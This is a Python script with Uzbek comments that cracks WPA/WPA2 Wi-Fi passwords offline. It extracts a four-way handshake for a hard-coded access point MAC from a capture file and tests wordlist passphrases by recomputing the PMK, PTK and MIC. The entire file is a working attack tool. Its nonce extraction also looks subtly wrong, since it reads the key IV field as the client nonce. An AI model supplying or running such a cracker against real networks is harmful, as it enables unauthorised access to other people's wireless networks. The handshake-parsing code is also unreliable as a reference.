import sys
import hmac
import hashlib
import binascii
import time
from scapy.all import rdpcap, EAPOL, Dot11Beacon, Dot11Elt

def extract_ssid(packets):
    for pkt in packets:
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
            return ssid
    return None

def extract_handshake(packets, target_ap_mac="10:8e:e0:cf:2e:26"):
    target_ap_mac = target_ap_mac.lower()
    for pkt in packets:
        if pkt.haslayer(EAPOL):
            try:
                # AP MAC manzilini tekshirish
                ap_mac = pkt.addr2.lower() if pkt.addr2 else None
                if ap_mac != target_ap_mac:
                    continue
                    
                client_mac = pkt.addr1.lower() if pkt.addr1 else None
                if not client_mac:
                    continue
                    
                eapol = pkt.getlayer(EAPOL).original
                if len(eapol) < 97:
                    continue
                    
                # MIC va noncelarni olish
                mic = eapol[81:97].hex()
                anonce = eapol[13:45]
                snonce = eapol[45:77]
                
                # MICsiz EAPOL paketi
                eapol_data = eapol[:81] + b'\x00'*16 + eapol[97:]
                
                return (ap_mac.replace(':', ''),
                       client_mac.replace(':', ''),
                       anonce,
                       snonce,
                       mic,
                       eapol_data)
            except Exception as e:
                print(f"Xato paketda: {e}")
                continue
    return None, None, None, None, None, None

def pmk(passphrase, ssid):
    return hashlib.pbkdf2_hmac('sha1', 
                             passphrase.encode('utf-8'), 
                             ssid.encode('utf-8'), 
                             4096, 
                             32)

def ptk(pmk, a_mac, s_mac, a_nonce, s_nonce):
    # PTK hisoblash
    min_mac = min(a_mac, s_mac)
    max_mac = max(a_mac, s_mac)
    min_nonce = min(a_nonce, s_nonce)
    max_nonce = max(a_nonce, s_nonce)
    
    data = min_mac + max_mac + min_nonce + max_nonce
    ptk = b''
    for i in range(4):
        ptk += hmac.new(pmk, 
                       b"Pairwise key expansion\x00" + 
                       data + 
                       bytes([i]), 
                       hashlib.sha1).digest()
    return ptk[:64]

def crack(cap_file, wordlist_file):
    print("Fayllarni yuklash...")
    packets = rdpcap(cap_file)
    ssid = extract_ssid(packets) or input("SSID topilmadi. Kiriting: ")
    
    print("Handshake qidirilmoqda...")
    ap_mac, client_mac, anonce, snonce, real_mic, eapol = extract_handshake(packets)
    
    if not all([ap_mac, client_mac, anonce, snonce, real_mic, eapol]):
        print("Xato: To'liq handshake topilmadi!")
        print("Quyidagilar topildi:")
        print(f"AP MAC: {ap_mac}")
        print(f"Client MAC: {client_mac}")
        print(f"ANonce: {bool(anonce)}")
        print(f"SNonce: {bool(snonce)}")
        print(f"MIC: {bool(real_mic)}")
        print(f"EAPOL: {bool(eapol)}")
        return

    print(f"\nTarmoq ma'lumotlari:")
    print(f"SSID: {ssid}")
    print(f"AP MAC: {ap_mac}")
    print(f"Client MAC: {client_mac}")
    print(f"Handshake paketi topildi!\n")

    print("Parolni tekshirish boshlandi...")
    start_time = time.time()
    tested = 0

    try:
        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                passphrase = line.strip()
                if not passphrase:
                    continue
                
                tested += 1
                try:
                    # PMK hisoblash
                    pmk_val = pmk(passphrase, ssid)
                    
                    # MAC manzillarni bytes ga o'tkazish
                    a_mac = binascii.unhexlify(ap_mac)
                    s_mac = binascii.unhexlify(client_mac)
                    
                    # PTK va MIC hisoblash
                    ptk_val = ptk(pmk_val, a_mac, s_mac, anonce, snonce)
                    kck = ptk_val[:16]
                    mic = hmac.new(kck, eapol, hashlib.sha1).digest()[:16].hex()
                    
                    # Progressni ko'rsatish
                    if tested % 100 == 0:
                        elapsed = time.time() - start_time
                        speed = tested / elapsed if elapsed > 0 else 0
                        print(f"Tekshirildi: {tested} | So'nggi: {passphrase[:20]}... | Tezlik: {speed:.1f} parol/s", end='\r')
                    
                    if mic == real_mic:
                        elapsed = time.time() - start_time
                        print(f"\n\n[+] PAROL TOPILDI: '{passphrase}'")
                        print(f"Testlar soni: {tested}")
                        print(f"Vaqt: {elapsed:.2f} soniya")
                        return
                        
                except Exception as e:
                    print(f"\nXato parolni tekshirishda: {e}")
                    continue

    except KeyboardInterrupt:
        print("\nTo'xtatildi.")
        return

    print("\n[-] Parol topilmadi. Wordlistda yo'q yoki handshake to'liq emas.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Foydalanish: python crack.py handshake.cap wordlist.txt")
        sys.exit(1)
        
    crack(sys.argv[1], sys.argv[2])